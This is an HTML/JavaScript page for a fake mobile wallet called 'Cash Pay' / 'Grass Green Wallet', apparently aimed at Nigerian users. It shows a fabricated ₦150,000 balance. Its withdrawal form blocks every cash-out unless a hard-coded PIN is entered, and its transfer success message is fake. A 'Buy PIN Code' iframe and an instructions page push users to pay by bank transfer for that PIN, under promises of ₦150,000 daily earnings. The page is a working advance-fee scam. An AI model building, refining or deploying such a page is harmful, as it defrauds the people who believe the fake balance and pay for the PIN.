<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Grass Green Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background-color: #fff;
      padding: 20px;
    }
    input[type="text"], input[type="password"], input[type="number"], select {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
      margin-top: 10px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #228B22;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover { opacity: 0.95; }
    #registerPage, #walletPage, #cashOutPage, #loadingBox, #successBox, #applicationHistoryPage { display: none; }
    #registerPage {
      max-width: 400px;
      margin: 60px auto;
    }
    #registerPage h1 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 10px;
    }
    .remember {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }
    .remember input {
      width: 20px;
      height: 20px;
      margin-right: 10px;
    }
    #success-message, #error-message {
      margin-top: 20px;
      font-weight: 600;
      text-align: center;
    }
    #success-message { color: #228B22; display: none; }
    #error-message { color: red; display: none; }
    #loading {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .spinner {
      width: 30px;
      height: 30px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #228B22;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    .profile {
      display: flex;
      align-items: center;
      font-size: 18px;
      font-weight: 500;
    }
    .profile img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      margin-right: 10px;
    }
    .menu {
      font-size: 28px;
      background: #00a000;
      padding: 8px 12px;
      border-radius: 8px;
      color: white;
    }
    .wallet-card {
      background: #00a000;
      color: white;
      border-radius: 15px;
      padding: 24px;
      position: relative;
      margin-bottom: 24px;
    }
    .wallet-card .title {
      font-size: 14px;
      opacity: 0.95;
    }
    .wallet-card .amount {
      font-size: 36px;
      font-weight: bold;
      margin-top: 4px;
    }
    .wallet-card .cash-out {
      position: absolute;
      top: 20px;
      right: 20px;
      background: #fff;
      color: #00a000;
      padding: 6px 16px;
      border-radius: 20px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
    }
    .wallet-card .details {
      display: flex;
      justify-content: space-between;
      margin-top: 20px;
      font-size: 14px;
    }
    .wallet-card .details div strong {
      display: block;
      font-size: 16px;
      margin-top: 2px;
    }
    .quick {
      background: #00a000;
      border-radius: 15px;
      padding: 20px;
      color: white;
    }
    .quick h3 {
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: 600;
    }
    .actions {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 14px;
    }
    .actions button {
      background: white;
      color: #00a000;
      font-weight: 600;
      font-size: 14px;
      padding: 14px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    #cashOutPage {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: #fff;
      padding: 20px;
      z-index: 999;
      overflow-y: auto;
    }
    #cashOutPage h2 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    .success-box, .loading-box { text-align: center; }
    .success-check {
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
    }
    .success-title {
      font-size: 24px;
      font-weight: bold;
      color: #28a745;
      margin-bottom: 10px;
    }
    .success-message {
      font-size: 16px;
      color: #333;
      margin-bottom: 30px;
    }
    .loading-text {
      font-size: 16px;
      color: #444;
      margin-top: 10px;
    }
    .spinner.large {
      width: 50px;
      height: 50px;
      border: 5px solid #ddd;
      border-top: 5px solid #28a745;
    }
  </style>
</head>
<body>

<!-- Register Page -->
<div id="registerPage">
  <h1>Welcome<br>User!</h1>
  <input type="text" id="username" placeholder="Email">
  <input type="password" id="password" placeholder="Create your Password">
  <div class="remember">
    <input type="checkbox" id="remember">
    <label for="remember">Remember me</label>
  </div>
  <button onclick="submitForm()">Register</button>
  <div id="loading"><div class="spinner"></div><div style="margin-top: 10px;">Processing...</div></div>
  <div id="success-message">Registration successful! Redirecting...</div>
  <div id="error-message">Please enter both email and password.</div>
</div>

<!-- Wallet Page -->
<div id="walletPage">
  <div class="header">
    <div class="profile">
      <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" />
      Good day!
    </div>
    <div class="menu">&#9776;</div>
  </div>
  <div class="wallet-card">
    <div class="title">Available Naria</div>
    <div class="amount">&#8358;150,000</div>
    <div class="cash-out" onclick="goToCashOut()">Cash out</div>
    <div class="details">
      <div>Current balance<strong>&#8358;150,000.00</strong></div>
      <div>Free bonus<strong>&#8358;100.00</strong></div>
    </div>
  </div>
  <div class="quick">
    <h3>Quick actions</h3>
    <div class="actions">
      <button onclick="openPinCode()">Buy PIN Code</button>
      <button>Buy Airtime</button>
      <button>Buy Data Network</button>
      <button onclick="window.open('https://whatsapp.com/channel/0029Vb6bBLj3rZZkiptuvC20', '_blank')">Join Channel</button>
      <button onclick="showApplicationHistory()">Application history</button>
      <button>Change password</button>
    </div>
  </div>
</div>

<!-- Application History Page -->
<div id="applicationHistoryPage">
  <h2 style="margin-bottom: 15px;">Application History</h2>
  <div style="line-height: 1.6; font-size: 15px; color: #333;">
    <p><strong>Looking for a reliable way to earn?</strong> Cash Pay Application is a highly legitimate platform that allows you to potentially make up to ₦150,000 daily without spending a lot of time. Here's how to get started:</p><br>
    <p><strong>(1): Verify Your Account</strong><br>
    Complete the in-app verification by providing your PIN code, Gmail, and full name.</p><br>
    <p><strong>(2): Make Your Payment</strong><br>
    Once verified, you'll see the bank details. Copy these details and proceed with your payment.</p><br>
    <p><strong>(3): Confirm Payment</strong><br>
    After making your payment, go back to the app and select "Live Made Payment." Your payment will be verified and confirmed immediately.</p><br>
    <p><strong>(4): Important Payment information</strong><br>
    Please do not use OPay for any payments to Cash Pay. We cannot accept transfers from OPay. Kindly use other banks for your transactions.</p><br>
    <p><strong>Please Note⁉️:</strong><br>
    To ensure your security, never purchase PIN codes from external vendors as this could lead to scams. If you encounter any issues or haven't received your PIN code after payment, our dedicated app support team is available to assist you. We are committed to providing a secure environment for all Cash Pay Application users. Thank you for taking the time to understand this vital information!</p>
  </div>
  <button onclick="backToWallet()" style="margin-top: 30px; background-color: #00a000;">Go Back to Wallet</button>
</div>

<!-- Cash Out -->
<div id="cashOutPage">
  <h2>Cash Pay - Transfer</h2>
  <form id="transferForm">
    <select id="bank" required>
      <option value="">--Select Bank--</option>
      <option>Access Bank</option>
      <option>UBA</option>
      <option>GTBank</option>
      <option>OPay Bank</option>
      <option>Palmpay Bank</option>
      <option>Moniepoint Bank</option>
      <option>Kuda Bank</option>
      <option>Smart Cash</option>
      <option>First Bank of Africa</option>
      <option>union Bank</option>
      <option>MTN MOMO</option>
      <option>Zenith Bank</option>
      <option>Accoin Bank</option>
    </select>
    <input type="text" id="accountNumber" placeholder="Account number" required />
    <input type="text" id="accountName" placeholder="Account name" required />
    <input type="number" id="amount" placeholder="Enter amount" required />
    <input type="password" id="pin" placeholder="Enter PIN" required />
    <div id="pinError" style="color:red; text-align:center; margin-top:10px; display:none;">Incorrect PIN code. Please check the code and try again.</div>
    <button type="submit">Withdraw</button>
  </form>
</div>

<!-- Loading -->
<div id="loadingBox" class="loading-box">
  <div class="spinner large"></div>
  <div class="loading-text">Processing transfer, please wait...</div>
</div>

<!-- Success -->
<div id="successBox" class="success-box">
  <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" class="success-check" />
  <div class="success-title">Transfer Successful</div>
  <div class="success-message" id="successMessage">Your transfer has been processed successfully.</div>
  <button onclick="location.reload()">OK, I Got It</button>
</div>

<!-- PIN Code Page -->
<div id="pinCodeFrame" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:1000;">
  <iframe src="https://onyebuchi23.github.io/buy/" style="width:100%; height:100%; border:none;"></iframe>
</div>

<script>
  function submitForm() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    const loading = document.getElementById("loading");
    const success = document.getElementById("success-message");
    const error = document.getElementById("error-message");
    success.style.display = "none";
    error.style.display = "none";
    if (!username || !password) {
      error.style.display = "block";
      return;
    }
    loading.style.display = "block";
    setTimeout(() => {
      loading.style.display = "none";
      success.style.display = "block";
      setTimeout(() => {
        document.getElementById("registerPage").style.display = "none";
        document.getElementById("walletPage").style.display = "block";
        window.scrollTo(0, 0);
      }, 2500);
    }, 2000);
  }

  function goToCashOut() {
    document.getElementById("walletPage").style.display = "none";
    document.getElementById("cashOutPage").style.display = "block";
    window.scrollTo(0, 0);
  }

  function showApplicationHistory() {
    document.getElementById("walletPage").style.display = "none";
    document.getElementById("applicationHistoryPage").style.display = "block";
    window.scrollTo(0, 0);
  }

  function openPinCode() {
    document.getElementById("walletPage").style.display = "none";
    document.getElementById("pinCodeFrame").style.display = "block";
    window.scrollTo(0, 0);
  }

  function backToWallet() {
    document.getElementById("applicationHistoryPage").style.display = "none";
    document.getElementById("walletPage").style.display = "block";
    window.scrollTo(0, 0);
  }

  document.getElementById("transferForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const pin = document.getElementById("pin").value.trim();
    const pinError = document.getElementById("pinError");
    if (pin !== "Cash@2025") {
      pinError.style.display = "block";
      return;
    } else {
      pinError.style.display = "none";
    }
    document.getElementById("cashOutPage").style.display = "none";
    document.getElementById("loadingBox").style.display = "block";
    setTimeout(function() {
      const amount = parseFloat(document.getElementById("amount").value);
      const formattedAmount = "₦" + amount.toLocaleString('en-NG', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      });
      document.getElementById("successMessage").innerText =
        "Your transfer of " + formattedAmount + " was successful.";
      document.getElementById("loadingBox").style.display = "none";
      document.getElementById("successBox").style.display = "block";
    }, 3000);
  });

  document.getElementById("registerPage").style.display = "block";
</script>
</body>
</html>
